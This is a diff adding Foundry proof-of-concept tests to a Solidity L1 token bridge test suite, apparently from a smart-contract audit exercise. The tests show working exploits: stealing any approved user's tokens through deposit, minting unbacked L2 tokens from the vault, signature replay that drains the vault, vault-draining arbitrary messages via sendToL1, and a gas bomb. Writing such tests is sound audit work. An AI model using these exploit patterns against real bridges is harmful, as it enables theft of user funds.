@@ -1,7 +1,7 @@
 // SPDX-License-Identifier: MIT
 pragma solidity 0.8.20;
 
-import { Test, console2 } from "forge-std/Test.sol";
+import { Test, console } from "forge-std/Test.sol";
 import { ECDSA } from "openzeppelin/contracts/utils/cryptography/ECDSA.sol";
 import { MessageHashUtils } from "openzeppelin/contracts/utils/cryptography/MessageHashUtils.sol";
 import { Ownable } from "openzeppelin/contracts/access/Ownable.sol";
@@ -222,5 +222,141 @@ contract L1BossBridgeTest is Test {
         returns (uint8 v, bytes32 r, bytes32 s)
     {
         return vm.sign(privateKey, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+    }
+
+
+    function testl1TokensCanBeDepositedByArbitraryUserOnceApproved() public {
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+
+        uint256 amountToDeposit = token.balanceOf(user);
+        address attacker = makeAddr("attacker");
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(user, attacker, amountToDeposit);
+        tokenBridge.depositTokensToL2(user, attacker, amountToDeposit);
+
+        assertEq(token.balanceOf(user), 0);
+        assertEq(token.balanceOf(address(vault)), amountToDeposit);
+    }
+
+
+    function testAttackerCanMintInfiniteL2TokensWithoutPaying () public {
+        vm.prank(user);
+        token.approve(address(tokenBridge), type(uint256).max);
+        uint256 amountToDeposit = token.balanceOf(user);
+        tokenBridge.depositTokensToL2(user, user, amountToDeposit);
+
+        uint256 amountToSteal = token.balanceOf(address(vault));
+        address attacker = makeAddr("attacker");
+
+        // We try to get minted L2 tokens using the balance of the vault
+        // Can do this forever and mint infinite tokens from L2
+        vm.startPrank(attacker);
+        vm.expectEmit(address(tokenBridge));
+        emit Deposit(address(vault), attacker, amountToSteal);
+        tokenBridge.depositTokensToL2(address(vault), attacker, amountToSteal);
+
+        assert(token.balanceOf(address(vault)) != amountToDeposit + amountToSteal);
+        // The balance should be the same as the user deposited but the tokens minted now are doubled with
+        // the same balance
+        assertEq(token.balanceOf(address(vault)), amountToDeposit);
+    }
+
+
+    function testSignatureReplay() public {
+        address attacker = makeAddr("attacker");
+        uint256 attackerInitialBalance = 100e18;
+        uint256 vaultInitialBalance = 1000e18;
+
+        deal(address(token), address(vault), vaultInitialBalance);
+        deal(address(token), attacker, attackerInitialBalance);
+
+        // An attacker deposits some to L2
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
+
+        // The attacker request some withdraw to L1 so the signer has to do the transaction
+        
+        
+        // Operator is going to sign the withdrawal
+        bytes memory message = abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, attackerInitialBalance)));
+
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+
+        while (token.balanceOf(address(vault)) > 0) {
+            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
+        }
+
+        assertEq(token.balanceOf(attacker), vaultInitialBalance + attackerInitialBalance);
+        assertEq(token.balanceOf(address(vault)), 0);
+
+
+
+    }
+
+    function testSendArbitraryMessagesSendToL1Function() public {
+        address attacker = makeAddr("attacker");
+        uint256 attackerInitialBalance = 100e18;
+        uint256 vaultInitialBalance = 1000e18;
+
+        deal(address(token), address(vault), vaultInitialBalance);
+        deal(address(token), attacker, attackerInitialBalance);
+
+        // An attacker deposits some to L2
+        vm.startPrank(attacker);
+        token.approve(address(tokenBridge), type(uint256).max);
+        tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
+
+        // The attacker request some withdraw to L1 so the signer has to do the transaction
+        
+        
+        // We create a corrupt message to drain the vault
+        bytes memory message = abi.encode(address(token), 0, abi.encodeCall(IERC20.transferFrom, (address(vault), attacker, token.balanceOf(address(vault)))));
+
+        // The operator signs it without knowing it
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+        
+        // We can use this signature to call sendToL1 function and drain the vault
+        tokenBridge.sendToL1(v, r, s, message);
+    
+
+        assertEq(token.balanceOf(attacker), vaultInitialBalance + attackerInitialBalance);
+        assertEq(token.balanceOf(address(vault)), 0);
+
+    }
+
+    uint256[] public array;
+    function testGasBombOnArbitraryMessage() public {
+        TargetContract target = new TargetContract();
+        for (uint256 i = 0; i < 10000; i++) {
+            array.push(i);
+        }
+
+        uint256 startGas = gasleft();
+        bytes memory message = abi.encode(address(target), 0, abi.encodeCall(target.doHeavyComputation, (array)));
+        (uint8 v, bytes32 r, bytes32 s) = vm.sign(operator.key, MessageHashUtils.toEthSignedMessageHash(keccak256(message)));
+        tokenBridge.sendToL1(v, r, s, message);
+        uint256 gasUsed = startGas - gasleft();
+
+        console.log("Gas used: ", gasUsed);
+        // 10_000 -> 234867656
+        // 1_000  -> 23180063
+        // 100    -> 2341948
+    }
+
+}
+
+
+
+
+contract TargetContract {
+    uint256[] public data;
+
+    function doHeavyComputation(uint256[] memory inputData) public {
+        for (uint256 i = 0; i < inputData.length; i++) {
+            data.push(inputData[i]);
+        }
     }
 }
